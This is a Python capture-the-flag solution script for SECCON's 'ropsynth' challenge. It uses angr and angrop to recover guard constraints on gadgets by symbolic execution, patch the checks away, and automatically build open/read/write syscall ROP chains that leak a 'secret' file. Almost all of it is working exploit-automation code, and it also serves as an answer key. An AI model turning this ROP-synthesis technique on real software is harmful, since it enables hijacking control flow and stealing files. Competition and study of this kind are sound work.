# This is an automatic ropchain synthesis challenge, where each ROP gadget is guarded by complex
# conditions that input must satisfy. We solve this challenge as follows:
#
# - we dump the received gadgets into an ELF for ease of analysis
# - we go through and recover the conditions associated with each guard condition
# - we replace the condition code with the ret instructions, so that angrop uses those gadgets
# - we use angrop to automatically generate a ropchain
# - we postprocess the ropchain to add input to it so that it passes the gadget constraints
#
# All this has to run 5 times, and should output the contents of the "secret" file each time.
# After this, the server gives us the flag.

import subprocess
import struct
import base64
import time

import angr
import angrop #pylint:disable=unused-variable
import simuvex
import claripy

def make_elf(gadgets):
    """
    This function places the autogenerated gadgets into an ELF, so that angrop can easily analyze them.
    """
    the_bytes = base64.b64decode(gadgets)
    for i in reversed(range(2, 20)):
        the_bytes = the_bytes.replace('\xf4'*i, '\xcc'*i)
    the_bytes = the_bytes.replace('\xc3\xf4', '\xc3\xcc')
    print "gadgets length:", len(the_bytes)
    the_bytes = the_bytes.ljust(4096, "\xcc")
    print "gadgets: %r" % the_bytes[:100]
    the_nops = open('nop.elf').read()
    the_gadgets = the_nops.replace("\x90"*4096, the_bytes)
    open('gadgets.elf', 'w').write(the_gadgets)

def postprocess_chain(chain, guard_solutions):
    """
    This function post-processes the chains generated by angrop to insert input to pass
    the conditions on each gadget. It takes two arguments:

        chain - the ropchain returned by angrop
        guard_solutions - the required inputs to satisfy the gadget checks
    """
    # we assemble the chain into bytes, since we will process it that way
    payload = chain.payload_str()

    # we iterate through the whole chain to fix up each gadget. The first 8
    # bytes of the remaining "payload" string always correspond to the address
    # of the next gadget in chain._gadgets
    guarded_chain = payload[:8]
    payload = payload[8:]
    for g in chain._gadgets:
        # each gadget records how it changes the stack, which is the amount of
        # input that it pops from the payload, so we add that to our result
        guarded_chain += payload[:g.stack_change - 8]
        payload = payload[g.stack_change - 8:]

        # now, we add the input to spatisfy the conditions for triggering the
        # next gadget before going on to analyze it
        guarded_chain += guard_solutions[g.addr]
        guarded_chain += payload[:8]
        payload = payload[8:]

    assert len(payload) == 0
    return guarded_chain

def get_gadgets():
    """
    This is where most of the magic happens -- get_gadgets loads our constructed ELF with
    our gadgets, recovers the ropchain and the conditions, and fixes up the ropchain.
    """
    p = angr.Project('gadgets.elf')

    # Amazingly, angr's CFG can deal with this franken-elf.
    cfg = p.analyses.CFG()

    # There is one gadget per function. We'll go through each one and recover the guard constraints (and replace
    # the checks with int3 for angrop to function properly.
    guard_solutions = { }
    for f in cfg.functions.values():
        if len(list(f.blocks)) <= 1:
            # malformed function
            continue

        #
        # First, let's get the path group.
        #

        # Here, we set up a stack full of symbolic data so that we can resolve it for the necessary values later.
        # We enable history tracking, since we'll use recorded actions to detect the input checks. Also, since
        # we'll trigger random syscall gadgets, we tell angr to ignore unknown syscalls.
        state = p.factory.blank_state(add_options={simuvex.o.TRACK_ACTION_HISTORY, simuvex.o.BYPASS_UNSUPPORTED_SYSCALL})
        stack_words = [ claripy.BVS('w%d'%i, 64) for i in range(20) ]
        state.memory.store(state.regs.rsp, claripy.Concat(*stack_words))

        # We symbolically explore the function. We are looking for the path that returns to an address popped off our
        # symbolic stack, so we want to save unconstrained states.
        pg = p.factory.path_group(state, save_unconstrained=True)
        pg.active[0].state.rip = f.addr # this is a workaround for a perceived (maybe not actual) but in angr
        pg.active[0].addr = f.addr # same here
        pg.explore(n=200)

        #
        # Now, we figure out the guards on our unconstrained state.
        #
        good_path = pg.unconstrained[0]

        # Get the variables that were actually used for the guards by looking at the expressions of the symbolic constraints.
        # We know (from reversing) that each guard condition will contain one variable, so we just get the first from each.
        symbolic_guard_guys = sorted(
            (next(ast for ast in guard.recursive_leaf_asts if ast.symbolic) for guard in good_path.guards if guard.symbolic),
            key=lambda v: next(iter(v.variables))
        )

        # Find where the input checks start, since that's where our valid gadgets end. Note that it's probably possible
        # to offset the gadgets in such a way as to skip the first check (and, thus, start the checks later), but we didn't
        # need to explore that, so we didn't do it.
        #
        # We find the start of the checks by looking for the first memory read action that read out any of the variables
        # that we identified as being part of our guard conditions.
        start_of_checks = min(
            action.ins_addr
            for action in good_path.actions
            if action.type == 'mem' and action.action == 'read' and (
                action.data.variables & frozenset.union(*(a.variables for a in symbolic_guard_guys))
            )
        )

        # Having identified the start of the checks and the separated out the variables that are checked,
        # we save off inputs needed to pass the checks for any given gadget before the start of the checks.
        # Since the checks pop data in order, we can just concat all the checked input.
        for a in range(f.addr, start_of_checks):
            guard_solutions[a] = good_path.state.se.any_str(claripy.Concat(*symbolic_guard_guys))

        #
        # With the checks recovered, we now overwrite them with a ret, so that angrop considers the gadgets
        # valid.
        #
        p.loader.main_bin.memory.write_bytes(start_of_checks, '\xc3')
        p.factory.default_engine.clear_cache()

    #
    # With all the checks removed, we should be now be able to do automatically ROP.
    #
    r = p.analyses.ROP()
    r.find_gadgets()

    # We make three gadget chains: one to do an open, one to do a read, and one to do a write.
    # We use the range [0xa00100, 0xa00f00] as scratch space for angrop. This is mapped writeable
    # for us by the challenge binary. Also, kindly, the challenge binary pre-populates this menory
    # region with "secret", which is the file that we need to cat out.
    chains = [
        r.do_syscall(2, (0xa00000, 0, 0), modifiable_memory_range=[0xa00100, 0xa00f00]), # this opens "secret", into file descriptor 3
        r.do_syscall(0, (3, 0xa00000, 1024), modifiable_memory_range=[0xa00100, 0xa00f00]), # this reads from file descriptor 3
        r.do_syscall(1, (1, 0xa00000), modifiable_memory_range=[0xa00100, 0xa00f00]) # this writes the read data to stdout
    ]

    # As a sanity check, we make sure that none of our auto-generated chains contain gadgets inside the guard solutions.
    # If they do, then the constraints that we generated above won't fly.
    for chain in chains:
        assert not [ g.addr for g in chain._gadgets if not g.addr in guard_solutions ]

    # We postprocess each of the chains to insert the inputs that will pass the checks after each gadget.
    guarded_chains = [ postprocess_chain(chain, guard_solutions) for chain in chains ]

    # There is one more postprocessing step -- we need to write "secret" exactly, so we need to write out the number of bytes
    # that read() returns. This means that we need to move the return value of read(), which is in rax, to the third argument of
    # write(), rdx. Luckily, there is a "mov rdx, rax" gadget. We'll find it and insert it between the read and the write.
    mov_gadget = next(g for g in r.gadgets if g.reg_moves and g.reg_moves[0].from_reg == 'rax' and g.reg_moves[0].to_reg == 'rdx')
    mov_chain = struct.pack("<Q", mov_gadget.addr) + guard_solutions[mov_gadget.addr] #pylint:disable=no-member
    guarded_chains.insert(2, mov_chain)

    #
    # We're ready! Return our post-processed chains.
    #
    final_payload = "".join(guarded_chains)
    return final_payload

def test():
    #r = pwn.remote('ropsynth.pwn.seccon.jp', 10000)
    #r = pwn.process("./ropsynth.py", stderr=2)
    r = subprocess.Popen(["./ropsynth.py"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

    # We need to do the auto-rop thing 5 times.
    for _ in range(5):
        r.stdout.read(6)
        print "STAGE:", r.stdout.read(1)
        r.stdout.read(3)

        # Get the gadgets
        time.sleep(1)
        gadgets = ""
        while not gadgets.endswith('\n'):
            gadgets += r.stdout.read(1)
        gadgets = gadgets.strip()

        # Make our franken-elf
        make_elf(gadgets)

        # Generate the gadgets
        chain = get_gadgets()

        # Send the gadgets
        r.stdin.write(base64.b64encode(chain) + "\n")

        # Make sure things are good
        status = r.stdout.read(3).strip()
        assert status == "OK"

    # After 5 successful rop synths, the binary sends up the flag.
    flag = r.stdout.read(128).strip()
    print "LOCAL FLAG:", flag
    assert flag == 'SECCON{HAHAHHAHAHAAHA}'

if __name__ == '__main__':
    test()
